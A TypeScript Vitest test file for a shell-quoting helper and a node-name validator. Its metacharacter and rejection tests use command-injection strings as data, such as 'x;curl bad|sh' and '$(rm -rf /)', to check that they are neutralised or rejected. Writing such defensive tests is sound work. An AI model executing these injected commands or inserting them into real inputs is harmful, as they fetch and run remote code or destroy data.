import { describe, expect, it } from "vitest";
import { isValidNodeName, shellQuote } from "./shell-quote";

describe("shellQuote", () => {
  it("wraps the empty string", () => {
    expect(shellQuote("")).toBe("''");
  });

  it("wraps a plain word in single quotes", () => {
    expect(shellQuote("hello")).toBe("'hello'");
  });

  it("escapes a single quote with the close-escape-reopen idiom", () => {
    expect(shellQuote("it's")).toBe(String.raw`'it'\''s'`);
  });

  it("preserves shell metacharacters as literals", () => {
    // The whole point: this MUST stay one argv entry, not start a
    // subshell or pipeline.
    expect(shellQuote("x;curl bad|sh")).toBe("'x;curl bad|sh'");
    expect(shellQuote("$(rm -rf /)")).toBe("'$(rm -rf /)'");
    expect(shellQuote("`echo pwn`")).toBe("'`echo pwn`'");
    expect(shellQuote("a && b")).toBe("'a && b'");
  });

  it("preserves whitespace including newlines", () => {
    expect(shellQuote("foo bar")).toBe("'foo bar'");
    expect(shellQuote("line1\nline2")).toBe("'line1\nline2'");
  });

  it("handles a string of only single quotes", () => {
    // Shell-evaluates to two literal single quotes.
    expect(shellQuote("''")).toBe(String.raw`''\'''\'''`);
  });

  it("handles a backslash literally (no escaping inside single quotes)", () => {
    expect(shellQuote(String.raw`path\to\thing`)).toBe(String.raw`'path\to\thing'`);
  });
});

describe("isValidNodeName", () => {
  it("accepts plain alnum", () => {
    expect(isValidNodeName("agent01")).toBe(true);
  });

  it("accepts dot, dash, underscore", () => {
    expect(isValidNodeName("edge-east_1.prod")).toBe(true);
  });

  it("rejects shell metacharacters", () => {
    expect(isValidNodeName("x;curl bad|sh")).toBe(false);
    expect(isValidNodeName("$(pwn)")).toBe(false);
    expect(isValidNodeName("a&b")).toBe(false);
    expect(isValidNodeName("a b")).toBe(false);
    expect(isValidNodeName("a\nb")).toBe(false);
    expect(isValidNodeName("'")).toBe(false);
  });

  it("rejects empty and overlong", () => {
    expect(isValidNodeName("")).toBe(false);
    expect(isValidNodeName("a".repeat(65))).toBe(false);
  });

  it("accepts the boundary length", () => {
    expect(isValidNodeName("a".repeat(64))).toBe(true);
  });
});
